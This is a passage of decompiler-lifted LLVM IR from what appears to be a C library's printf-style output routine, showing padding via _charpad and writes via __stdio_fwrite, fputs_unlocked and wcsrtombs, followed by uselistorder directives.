  %v1_8051c27 = add i32 %v0_8051c27, 24
  %v2_8051c27 = inttoptr i32 %v1_8051c27 to i32*
  %v3_8051c27 = load i32, i32* %v2_8051c27, align 4
  store i32 %v3_8051c27, i32* %eax.global-to-local, align 4
  %v1_8051c2b = add i32 %v0_8051c27, 8
  %v2_8051c2b = inttoptr i32 %v1_8051c2b to i32*
  store i32 0, i32* %v2_8051c2b, align 4
  %v0_8051c33 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c33 = load i32, i32* @edx, align 4
  %v2_8051c33 = sub i32 %v0_8051c33, %v1_8051c33
  %v7_8051c33 = icmp ult i32 %v0_8051c33, %v1_8051c33
  %v12_8051c33 = icmp eq i32 %v2_8051c33, 0
  %v13_8051c33 = icmp slt i32 %v2_8051c33, 0
  store i1 %v13_8051c33, i1* %sf.global-to-local, align 1
  %v2_8051c35 = or i1 %v7_8051c33, %v12_8051c33
  br i1 %v2_8051c35, label %dec_label_pc_8051c3d, label %dec_label_pc_8051c37

dec_label_pc_8051c37:                             ; preds = %dec_label_pc_8051c27
  store i1 %v13_8051c33, i1* %sf.global-to-local, align 1
  store i32 %v2_8051c33, i32* %eax.global-to-local, align 4
  %v1_8051c39 = load i32, i32* @esp, align 4
  %v2_8051c39 = add i32 %v1_8051c39, 8
  %v3_8051c39 = inttoptr i32 %v2_8051c39 to i32*
  store i32 %v2_8051c33, i32* %v3_8051c39, align 4
  %v0_8051c41.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051c3d

dec_label_pc_8051c3d:                             ; preds = %dec_label_pc_8051c27, %dec_label_pc_8051c37
  %v0_8051c41 = phi i32 [ %v1_8051c33, %dec_label_pc_8051c27 ], [ %v0_8051c41.pre, %dec_label_pc_8051c37 ]
  %v0_8051c3d = load i32, i32* @esp, align 4
  %v1_8051c3d = add i32 %v0_8051c3d, 8
  %v2_8051c3d = inttoptr i32 %v1_8051c3d to i32*
  %v3_8051c3d = load i32, i32* %v2_8051c3d, align 4
  store i32 %v3_8051c3d, i32* @ecx, align 4
  %v2_8051c41 = add i32 %v3_8051c3d, %v0_8051c41
  store i32 %v2_8051c41, i32* %eax.global-to-local, align 4
  %v1_8051c44 = inttoptr i32 %v0_8051c3d to i32*
  %v2_8051c44 = load i32, i32* %v1_8051c44, align 4
  %v4_8051c44 = add i32 %v2_8051c44, %v2_8051c41
  %v15_8051c44 = icmp slt i32 %v4_8051c44, 0
  store i1 %v15_8051c44, i1* %sf.global-to-local, align 1
  store i32 %v4_8051c44, i32* %v1_8051c44, align 4
  %v0_8051c47 = load i32, i32* @esp, align 4
  %v1_8051c47 = add i32 %v0_8051c47, 7
  %v2_8051c47 = inttoptr i32 %v1_8051c47 to i8*
  %v3_8051c47 = load i8, i8* %v2_8051c47, align 1
  %v4_8051c47 = add i8 %v3_8051c47, -48
  %v9_8051c47 = icmp eq i8 %v4_8051c47, 0
  %v10_8051c47 = icmp slt i8 %v4_8051c47, 0
  store i1 %v10_8051c47, i1* %sf.global-to-local, align 1
  %v1_8051c4c = icmp eq i1 %v9_8051c47, false
  br i1 %v1_8051c4c, label %dec_label_pc_8051c58, label %dec_label_pc_8051c4e

dec_label_pc_8051c4e:                             ; preds = %dec_label_pc_8051c3d
  %v0_8051c4e = load i32, i32* @ebx, align 4
  %v1_8051c4e = load i32, i32* @ecx, align 4
  %v2_8051c4e = add i32 %v1_8051c4e, %v0_8051c4e
  %v13_8051c4e = icmp slt i32 %v2_8051c4e, 0
  store i1 %v13_8051c4e, i1* %sf.global-to-local, align 1
  store i32 %v2_8051c4e, i32* @ebx, align 4
  %v1_8051c50 = add i32 %v0_8051c47, 8
  %v2_8051c50 = inttoptr i32 %v1_8051c50 to i32*
  store i32 0, i32* %v2_8051c50, align 4
  %v0_8051c58.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051c58

dec_label_pc_8051c58:                             ; preds = %dec_label_pc_8051c3d, %dec_label_pc_8051c4e
  %v0_8051c5f = phi i32 [ %v0_8051c47, %dec_label_pc_8051c3d ], [ %v0_8051c58.pre, %dec_label_pc_8051c4e ]
  %v1_8051c58 = add i32 %v0_8051c5f, 32
  %v2_8051c58 = inttoptr i32 %v1_8051c58 to i8*
  %v3_8051c58 = load i8, i8* %v2_8051c58, align 1
  %v4_8051c58 = and i8 %v3_8051c58, 8
  %v5_8051c58 = icmp eq i8 %v4_8051c58, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8051c5d = icmp eq i1 %v5_8051c58, false
  br i1 %v1_8051c5d, label %dec_label_pc_8051c86, label %dec_label_pc_8051c5f

dec_label_pc_8051c5f:                             ; preds = %dec_label_pc_8051c58
  %v1_8051c5f = add i32 %v0_8051c5f, 8
  %v2_8051c5f = inttoptr i32 %v1_8051c5f to i32*
  %v3_8051c5f = load i32, i32* %v2_8051c5f, align 4
  store i32 %v3_8051c5f, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8051c68 = add i32 %v0_8051c5f, 368
  %v2_8051c68 = inttoptr i32 %v1_8051c68 to i32*
  %v3_8051c68 = load i32, i32* %v2_8051c68, align 4
  store i32 %v3_8051c68, i32* @eax, align 4
  %v0_8051c6f = call i32 @_charpad()
  store i32 %v0_8051c6f, i32* %eax.global-to-local, align 4
  %v1_8051c74 = load i32, i32* @esp, align 4
  %v2_8051c74 = add i32 %v1_8051c74, 8
  %v3_8051c74 = inttoptr i32 %v2_8051c74 to i32*
  %v4_8051c74 = load i32, i32* %v3_8051c74, align 4
  %v5_8051c74 = sub i32 %v0_8051c6f, %v4_8051c74
  %v15_8051c74 = icmp eq i32 %v5_8051c74, 0
  %v16_8051c74 = icmp slt i32 %v5_8051c74, 0
  store i1 %v16_8051c74, i1* %sf.global-to-local, align 1
  %v1_8051c78 = icmp eq i1 %v15_8051c74, false
  br i1 %v1_8051c78, label %dec_label_pc_8051d73, label %dec_label_pc_8051c7e

dec_label_pc_8051c7e:                             ; preds = %dec_label_pc_8051c5f
  store i32 0, i32* %v3_8051c74, align 4
  %v1_8051c86.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051c86

dec_label_pc_8051c86:                             ; preds = %dec_label_pc_8051c58, %dec_label_pc_8051c7e
  %v1_8051c86 = phi i32 [ %v0_8051c5f, %dec_label_pc_8051c58 ], [ %v1_8051c86.pre, %dec_label_pc_8051c7e ]
  %v0_8051c86 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051c86 = add i32 %v1_8051c86, -4
  %v3_8051c86 = inttoptr i32 %v2_8051c86 to i32*
  store i32 %v0_8051c86, i32* %v3_8051c86, align 4
  %v0_8051c87 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051c87 = add i32 %v1_8051c86, -8
  %v3_8051c87 = inttoptr i32 %v2_8051c87 to i32*
  store i32 %v0_8051c87, i32* %v3_8051c87, align 4
  %v1_8051c88 = add i32 %v1_8051c86, 368
  %v2_8051c88 = inttoptr i32 %v1_8051c88 to i32*
  %v3_8051c88 = load i32, i32* %v2_8051c88, align 4
  %v5_8051c88 = add i32 %v1_8051c86, -12
  %v6_8051c88 = inttoptr i32 %v5_8051c88 to i32*
  store i32 %v3_8051c88, i32* %v6_8051c88, align 4
  %v0_8051c8f = load i32, i32* @ebp, align 4
  %v1_8051c8f = add i32 %v0_8051c8f, ptrtoint (i32* @global_var_8059cc5.473 to i32)
  store i32 %v1_8051c8f, i32* %eax.global-to-local, align 4
  %v2_8051c95 = add i32 %v1_8051c86, -16
  %v3_8051c95 = inttoptr i32 %v2_8051c95 to i32*
  store i32 %v1_8051c8f, i32* %v3_8051c95, align 4
  %v0_8051c96 = load i32, i32* %stack_var_-364, align 4
  %v4_8051c96 = inttoptr i32 %v0_8051c96 to i8*
  %v5_8051c96 = call i32 @__GI_fputs_unlocked(i8* %v4_8051c96, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051c96, i32* %eax.global-to-local, align 4
  %v0_8051c9b = load i32, i32* @esp, align 4
  %v1_8051c9b = add i32 %v0_8051c9b, 384
  %v2_8051c9b = inttoptr i32 %v1_8051c9b to i32*
  %v3_8051c9b = load i32, i32* %v2_8051c9b, align 4
  store i32 %v3_8051c9b, i32* @eax, align 4
  %v0_8051ca2 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ca2, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8051ca9 = call i32 @_charpad()
  store i32 %v0_8051ca9, i32* %eax.global-to-local, align 4
  %v0_8051cae = load i32, i32* @esp, align 4
  %v1_8051cae = add i32 %v0_8051cae, 16
  %v1_8051cb1 = load i32, i32* @ebx, align 4
  %v2_8051cb1 = sub i32 %v0_8051ca9, %v1_8051cb1
  %v12_8051cb1 = icmp eq i32 %v2_8051cb1, 0
  %v13_8051cb1 = icmp slt i32 %v2_8051cb1, 0
  store i1 %v13_8051cb1, i1* %sf.global-to-local, align 1
  %v1_8051cb3 = icmp eq i1 %v12_8051cb1, false
  br i1 %v1_8051cb3, label %dec_label_pc_8051d73, label %dec_label_pc_8051cb9

dec_label_pc_8051cb9:                             ; preds = %dec_label_pc_8051c86
  %v1_8051cb9 = add i32 %v0_8051cae, 356
  %v2_8051cb9 = inttoptr i32 %v1_8051cb9 to i32*
  %v3_8051cb9 = load i32, i32* %v2_8051cb9, align 4
  %v4_8051cb9 = icmp eq i32 %v3_8051cb9, 0
  %v5_8051cb9 = icmp slt i32 %v3_8051cb9, 0
  store i1 %v5_8051cb9, i1* %sf.global-to-local, align 1
  %v1_8051cc1 = icmp eq i1 %v4_8051cb9, false
  br i1 %v1_8051cc1, label %dec_label_pc_8051ce5, label %dec_label_pc_8051cc3

dec_label_pc_8051cc3:                             ; preds = %dec_label_pc_8051cb9
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051cc5 = load i32, i32* @esi, align 4
  %v1_8051cc5 = icmp eq i32 %v0_8051cc5, 0
  %v2_8051cc5 = icmp slt i32 %v0_8051cc5, 0
  store i1 %v2_8051cc5, i1* %sf.global-to-local, align 1
  br i1 %v1_8051cc5, label %dec_label_pc_8051cdb, label %dec_label_pc_8051cc9

dec_label_pc_8051cc9:                             ; preds = %dec_label_pc_8051cc3
  %v2_8051cc9 = add i32 %v0_8051cae, 12
  %v3_8051cc9 = inttoptr i32 %v2_8051cc9 to i32*
  store i32 0, i32* %v3_8051cc9, align 4
  %v1_8051cca = add i32 %v0_8051cae, 384
  %v2_8051cca = inttoptr i32 %v1_8051cca to i32*
  %v3_8051cca = load i32, i32* %v2_8051cca, align 4
  %v5_8051cca = add i32 %v0_8051cae, 8
  %v6_8051cca = inttoptr i32 %v5_8051cca to i32*
  store i32 %v3_8051cca, i32* %v6_8051cca, align 4
  %v0_8051cd1 = load i32, i32* @esi, align 4
  %v2_8051cd1 = add i32 %v0_8051cae, 4
  %v3_8051cd1 = inttoptr i32 %v2_8051cd1 to i32*
  store i32 %v0_8051cd1, i32* %v3_8051cd1, align 4
  %v0_8051cd2 = load i32, i32* @edi, align 4
  %v3_8051cd2 = inttoptr i32 %v0_8051cae to i32*
  store i32 %v0_8051cd2, i32* %v3_8051cd2, align 4
  %v0_8051cd3 = load i32, i32* %stack_var_-364, align 4
  %v4_8051cd3 = call i32 @__stdio_fwrite(i32 %v0_8051cd3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051cd3, i32* %eax.global-to-local, align 4
  %v0_8051cd8 = load i32, i32* @esp, align 4
  %v1_8051cd8 = add i32 %v0_8051cd8, 16
  %v7_8051cd8 = icmp slt i32 %v1_8051cd8, 0
  store i1 %v7_8051cd8, i1* %sf.global-to-local, align 1
  %v1_8051cdb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051cdb

dec_label_pc_8051cdb:                             ; preds = %dec_label_pc_8051cc3, %dec_label_pc_8051cc9
  %v0_8051d4548 = phi i32 [ %v1_8051cae, %dec_label_pc_8051cc3 ], [ %v1_8051cd8, %dec_label_pc_8051cc9 ]
  %v1_8051cdb = phi i32 [ 0, %dec_label_pc_8051cc3 ], [ %v1_8051cdb.pre, %dec_label_pc_8051cc9 ]
  %v0_8051cdb = phi i32 [ 0, %dec_label_pc_8051cc3 ], [ %v4_8051cd3, %dec_label_pc_8051cc9 ]
  %v2_8051cdb = sub i32 %v0_8051cdb, %v1_8051cdb
  %v12_8051cdb = icmp eq i32 %v2_8051cdb, 0
  %v13_8051cdb = icmp slt i32 %v2_8051cdb, 0
  store i1 %v13_8051cdb, i1* %sf.global-to-local, align 1
  %v1_8051cdd = icmp eq i1 %v12_8051cdb, false
  br i1 %v1_8051cdd, label %dec_label_pc_8051d73, label %dec_label_pc_8051d45

dec_label_pc_8051ce5:                             ; preds = %dec_label_pc_8051cb9
  %v1_8051ce5 = add i32 %v0_8051cae, 348
  %v2_8051ce5 = inttoptr i32 %v1_8051ce5 to i32*
  store i32 0, i32* %v2_8051ce5, align 4
  %v0_8051d4110 = load i32, i32* @esi, align 4
  %v1_8051d4111 = icmp eq i32 %v0_8051d4110, 0
  %v2_8051d4112 = icmp slt i32 %v0_8051d4110, 0
  store i1 %v2_8051d4112, i1* %sf.global-to-local, align 1
  %v1_8051d4318 = icmp eq i1 %v1_8051d4111, false
  %v0_8051cf2.pre = load i32, i32* @esp, align 4
  br i1 %v1_8051d4318, label %dec_label_pc_8051cf2, label %dec_label_pc_8051d45

dec_label_pc_8051cf2:                             ; preds = %dec_label_pc_8051ce5, %dec_label_pc_8051d3f
  %v0_8051cf9 = phi i32 [ %v2_8051d3f, %dec_label_pc_8051d3f ], [ %v0_8051d4110, %dec_label_pc_8051ce5 ]
  %v1_8051d04 = phi i32 [ %v0_8051cf243, %dec_label_pc_8051d3f ], [ %v0_8051cf2.pre, %dec_label_pc_8051ce5 ]
  %v1_8051cf2 = add i32 %v1_8051d04, 332
  store i32 %v1_8051cf2, i32* %edx.global-to-local, align 4
  %v1_8051cf9 = add i32 %v0_8051cf9, -128
  %v2_8051cf9 = icmp ult i32 %v0_8051cf9, 128
  %v6_8051cf9 = icmp eq i32 %v1_8051cf9, 0
  %v7_8051cf9 = icmp slt i32 %v1_8051cf9, 0
  store i1 %v7_8051cf9, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_8051d04 = add i32 %v1_8051d04, -4
  %v3_8051d04 = inttoptr i32 %v2_8051d04 to i32*
  store i32 %v1_8051cf2, i32* %v3_8051d04, align 4
  %v2_8051d05 = or i1 %v2_8051cf9, %v6_8051cf9
  %v3_8051d05 = load i32, i32* %eax.global-to-local, align 4
  %v4_8051d05 = load i32, i32* @esi, align 4
  %v5_8051d05 = select i1 %v2_8051d05, i32 %v4_8051d05, i32 %v3_8051d05
  %v2_8051d08 = add i32 %v1_8051d04, -8
  %v3_8051d08 = inttoptr i32 %v2_8051d08 to i32*
  store i32 %v5_8051d05, i32* %v3_8051d08, align 4
  %v1_8051d09 = add i32 %v1_8051d04, 340
  store i32 %v1_8051d09, i32* %eax.global-to-local, align 4
  %v2_8051d10 = add i32 %v1_8051d04, -12
  %v3_8051d10 = inttoptr i32 %v2_8051d10 to i32*
  store i32 %v1_8051d09, i32* %v3_8051d10, align 4
  %v1_8051d11 = add i32 %v1_8051d04, 204
  store i32 %v1_8051d11, i32* @edi, align 4
  %v2_8051d18 = add i32 %v1_8051d04, -16
  %v3_8051d18 = inttoptr i32 %v2_8051d18 to i32*
  store i32 %v1_8051d11, i32* %v3_8051d18, align 4
  %v0_8051d19 = call i32 @__GI_wcsrtombs()
  %v0_8051d1e = load i32, i32* @esp, align 4
  %v1_8051d1e = add i32 %v0_8051d1e, 16
  store i32 %v0_8051d19, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051d25 = icmp eq i32 %v0_8051d19, 0
  %v2_8051d25 = icmp slt i32 %v0_8051d19, 0
  store i1 %v2_8051d25, i1* %sf.global-to-local, align 1
  br i1 %v1_8051d25, label %dec_label_pc_8051d3b, label %dec_label_pc_8051d29

dec_label_pc_8051d29:                             ; preds = %dec_label_pc_8051cf2
  %v0_8051d29 = load i32, i32* @ebp, align 4
  %v2_8051d29 = add i32 %v0_8051d1e, 12
  %v3_8051d29 = inttoptr i32 %v2_8051d29 to i32*
  store i32 %v0_8051d29, i32* %v3_8051d29, align 4
  %v1_8051d2a = add i32 %v0_8051d1e, 384
  %v2_8051d2a = inttoptr i32 %v1_8051d2a to i32*
  %v3_8051d2a = load i32, i32* %v2_8051d2a, align 4
  %v5_8051d2a = add i32 %v0_8051d1e, 8
  %v6_8051d2a = inttoptr i32 %v5_8051d2a to i32*
  store i32 %v3_8051d2a, i32* %v6_8051d2a, align 4
  %v2_8051d31 = add i32 %v0_8051d1e, 4
  %v3_8051d31 = inttoptr i32 %v2_8051d31 to i32*
  store i32 %v0_8051d19, i32* %v3_8051d31, align 4
  %v0_8051d32 = load i32, i32* @edi, align 4
  %v3_8051d32 = inttoptr i32 %v0_8051d1e to i32*
  store i32 %v0_8051d32, i32* %v3_8051d32, align 4
  %v0_8051d33 = load i32, i32* %stack_var_-364, align 4
  %v4_8051d33 = call i32 @__stdio_fwrite(i32 %v0_8051d33, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051d33, i32* %eax.global-to-local, align 4
  %v0_8051d38 = load i32, i32* @esp, align 4
  %v1_8051d38 = add i32 %v0_8051d38, 16
  %v7_8051d38 = icmp slt i32 %v1_8051d38, 0
  store i1 %v7_8051d38, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051d3b

dec_label_pc_8051d3b:                             ; preds = %dec_label_pc_8051cf2, %dec_label_pc_8051d29
  %v1_8051d3f = phi i32 [ 0, %dec_label_pc_8051cf2 ], [ %v4_8051d33, %dec_label_pc_8051d29 ]
  %v0_8051cf243 = phi i32 [ %v1_8051d1e, %dec_label_pc_8051cf2 ], [ %v1_8051d38, %dec_label_pc_8051d29 ]
  %v2_8051d3b = sub i32 %v1_8051d3f, %v0_8051d19
  %v12_8051d3b = icmp eq i32 %v2_8051d3b, 0
  %v13_8051d3b = icmp slt i32 %v2_8051d3b, 0
  store i1 %v13_8051d3b, i1* %sf.global-to-local, align 1
  %v1_8051d3d = icmp eq i1 %v12_8051d3b, false
  br i1 %v1_8051d3d, label %dec_label_pc_8051d73, label %dec_label_pc_8051d3f

dec_label_pc_8051d3f:                             ; preds = %dec_label_pc_8051d3b
  %v0_8051d3f = load i32, i32* @esi, align 4
  %v2_8051d3f = sub i32 %v0_8051d3f, %v1_8051d3f
  %v12_8051d3f = icmp eq i32 %v2_8051d3f, 0
  %v13_8051d3f = icmp slt i32 %v2_8051d3f, 0
  store i32 %v2_8051d3f, i32* @esi, align 4
  store i1 %v13_8051d3f, i1* %sf.global-to-local, align 1
  %v1_8051d43 = icmp eq i1 %v12_8051d3f, false
  br i1 %v1_8051d43, label %dec_label_pc_8051cf2, label %dec_label_pc_8051d45

dec_label_pc_8051d45:                             ; preds = %dec_label_pc_8051d3f, %dec_label_pc_8051ce5, %dec_label_pc_8051cdb
  %v0_8051d45 = phi i32 [ %v0_8051d4548, %dec_label_pc_8051cdb ], [ %v0_8051cf2.pre, %dec_label_pc_8051ce5 ], [ %v0_8051cf243, %dec_label_pc_8051d3f ]
  %v1_8051d45 = add i32 %v0_8051d45, 8
  %v2_8051d45 = inttoptr i32 %v1_8051d45 to i32*
  %v3_8051d45 = load i32, i32* %v2_8051d45, align 4
  store i32 %v3_8051d45, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8051d4e = add i32 %v0_8051d45, 368
  %v2_8051d4e = inttoptr i32 %v1_8051d4e to i32*
  %v3_8051d4e = load i32, i32* %v2_8051d4e, align 4
  store i32 %v3_8051d4e, i32* @eax, align 4
  %v0_8051d55 = call i32 @_charpad()
  store i32 %v0_8051d55, i32* %eax.global-to-local, align 4
  %v1_8051d5a = load i32, i32* @esp, align 4
  %v2_8051d5a = add i32 %v1_8051d5a, 8
  %v3_8051d5a = inttoptr i32 %v2_8051d5a to i32*
  %v4_8051d5a = load i32, i32* %v3_8051d5a, align 4
  %v5_8051d5a = sub i32 %v0_8051d55, %v4_8051d5a
  %v15_8051d5a = icmp eq i32 %v5_8051d5a, 0
  %v16_8051d5a = icmp slt i32 %v5_8051d5a, 0
  store i1 %v16_8051d5a, i1* %sf.global-to-local, align 1
  %v1_8051d5e = icmp eq i1 %v15_8051d5a, false
  br i1 %v1_8051d5e, label %dec_label_pc_8051d73, label %dec_label_pc_8051d60

dec_label_pc_8051d60:                             ; preds = %dec_label_pc_8051d45, %dec_label_pc_8051acd, %dec_label_pc_80518f8
  %v0_8051d60 = phi i32 [ %v1_8051d5a, %dec_label_pc_8051d45 ], [ %v0_8051d60.pre, %dec_label_pc_8051acd ], [ %v1_8051916, %dec_label_pc_80518f8 ]
  %v1_8051d60 = add i32 %v0_8051d60, 16
  %v2_8051d60 = inttoptr i32 %v1_8051d60 to i32*
  %v3_8051d60 = load i32, i32* %v2_8051d60, align 4
  store i32 %v3_8051d60, i32* @ebx, align 4
  store i32 %v3_8051d60, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051850.backedge

dec_label_pc_8051d6b:                             ; preds = %dec_label_pc_805188e
  %v1_8051d6b = add i32 %v0_8051d6b, 2
  %v10_8051d6b = icmp slt i32 %v1_8051d6b, 0
  store i1 %v10_8051d6b, i1* %sf.global-to-local, align 1
  store i32 %v1_8051d6b, i32* @ebx, align 4
  br label %dec_label_pc_8051850.backedge

dec_label_pc_8051d73:                             ; preds = %dec_label_pc_805187a, %dec_label_pc_8051d45, %dec_label_pc_8051cdb, %dec_label_pc_8051c86, %dec_label_pc_8051c5f, %dec_label_pc_8051bcf, %dec_label_pc_8051b42, %dec_label_pc_8051b03, %dec_label_pc_8051aa4, %dec_label_pc_8051d3b
  %v0_8051d73 = phi i32 [ %v0_8051cf243, %dec_label_pc_8051d3b ], [ %v0_8051d73.pre.pre, %dec_label_pc_805187a ], [ %v1_8051d5a, %dec_label_pc_8051d45 ], [ %v0_8051d4548, %dec_label_pc_8051cdb ], [ %v1_8051cae, %dec_label_pc_8051c86 ], [ %v1_8051c74, %dec_label_pc_8051c5f ], [ %v0_80518f0.lcssa, %dec_label_pc_8051bcf ], [ %v1_8051b5a, %dec_label_pc_8051b42 ], [ %v1_8051b26, %dec_label_pc_8051b03 ], [ %v1_8051ac2, %dec_label_pc_8051aa4 ]
  %v1_8051d73 = inttoptr i32 %v0_8051d73 to i32*
  store i32 -1, i32* %v1_8051d73, align 4
  br label %dec_label_pc_8051d7a

dec_label_pc_8051d7a:                             ; preds = %dec_label_pc_8051885, %dec_label_pc_80517f3, %dec_label_pc_8051812, %dec_label_pc_8051d73
  %v0_8051d7a = load i32, i32* @esp, align 4
  %v1_8051d7a = inttoptr i32 %v0_8051d7a to i32*
  %v2_8051d7a = load i32, i32* %v1_8051d7a, align 4
  store i32 %v2_8051d7a, i32* %eax.global-to-local, align 4
  %v1_8051d7d = add i32 %v0_8051d7a, 348
  %v10_8051d7d = icmp slt i32 %v1_8051d7d, 0
  store i1 %v10_8051d7d, i1* %sf.global-to-local, align 1
  ret i32 %v2_8051d7a

; uselistorder directives
  uselistorder i32 %v1_8051d6b, { 1, 2, 0 }
  uselistorder i32 %v3_8051d60, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8051d45, { 1, 0 }
  uselistorder i32 %v2_8051d3f, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8051d1e, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8051d19, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_8051cf9, { 1, 0 }
  uselistorder i32 %v0_8051cf2.pre, { 1, 0 }
  uselistorder i32 %v0_8051cc5, { 1, 0 }
  uselistorder i32 %v3_8051cb9, { 1, 0 }
  uselistorder i32 %v0_8051cae, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8051c86, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8051c5f, { 0, 2, 1, 3 }
  uselistorder i8 %v4_8051c47, { 1, 0 }
  uselistorder i32 %v2_8051c33, { 1, 0, 2, 3 }
  uselistorder i32 %v6_8051c20, { 1, 0 }
  uselistorder i32 %v1_8051c1d, { 1, 0 }
  uselistorder i32 %v1_8051c13, { 1, 0 }
  uselistorder i32 %v0_8051c13, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8051bf2, { 1, 0 }
  uselistorder i32 %v1_8051bcf, { 1, 0 }
  uselistorder i32 %v1_8051b8d, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8051ba9, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8051b72, { 1, 0 }
  uselistorder i32 %v1_8051b5d, { 1, 0 }
  uselistorder i32 %v1_8051b29, { 1, 0 }
  uselistorder i32 %v0_8051b03, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8051ae9, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_8051ad5, { 1, 0 }
  uselistorder i32 %v1_8051a8b, { 1, 0 }
  uselistorder i32 %v4_8051a59, { 1, 0 }
  uselistorder i32 %v0_8051a4e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8051a49, { 1, 0 }
  uselistorder i32 %v0_8051a82, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8051a39, { 1, 0 }
  uselistorder i32 %v1_8051a30, { 1, 0 }
  uselistorder i32 %v1_8051a24, { 1, 0 }
  uselistorder i32 %v3_8051a18, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8051a0e, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8051a09, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_8051a07, { 1, 0 }
  uselistorder i32 %v0_8051a59, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8051a49, { 1, 2, 0 }
  uselistorder i32 %v3_80519e1, { 0, 1, 3, 2 }
  uselistorder i8 %v4_80519cf, { 1, 0 }
  uselistorder i32 %v4_80519c6, { 1, 0 }
  uselistorder i32 %v3_80519c6, { 1, 0 }
  uselistorder i32 %v6_80519be, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_805198f, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_805198e, { 2, 1, 0 }
  uselistorder i32 %v1_8051967, { 1, 0 }
  uselistorder i32 %v1_805195b, { 1, 0 }
  uselistorder i32 %v1_8051956, { 1, 0 }
  uselistorder i32 %v2_805194e, { 1, 0 }
  uselistorder i32 %tmp70, { 1, 0 }
  uselistorder i32 %v3_8051938, { 1, 0, 2 }
  uselistorder i8 %v3_8051927, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805191e, { 1, 0 }
  uselistorder i32 %v3_80518f0, { 4, 7, 9, 0, 1, 13, 14, 12, 11, 6, 8, 5, 15, 16, 10, 2, 3, 17, 18, 19 }
  uselistorder i32 %v0_80518f0.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_80518ec, { 1, 0 }
  uselistorder i32 %v1_80518ec.pre, { 1, 0 }
  uselistorder i32 %v1_80518eb, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_80518e8, { 1, 0 }
  uselistorder i32 %v2_80518ec74, { 1, 0 }
  uselistorder i32 %v3_80518d2, { 1, 0 }
  uselistorder i8 %v4_805188e, { 1, 0 }
  uselistorder i32 %v1_805188e, { 1, 0, 3, 2 }
  uselistorder i8 %v2_8051885, { 1, 0 }
  uselistorder i32 %v2_805185a, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_8051856, { 1, 0 }
  uselistorder i8 %v2_8051850, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805185e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051840, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 4, 7, 0, 6, 5, 1, 8, 9, 10, 11 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0, 62, 63, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61 }
  uselistorder i32 348, { 2, 0, 1 }
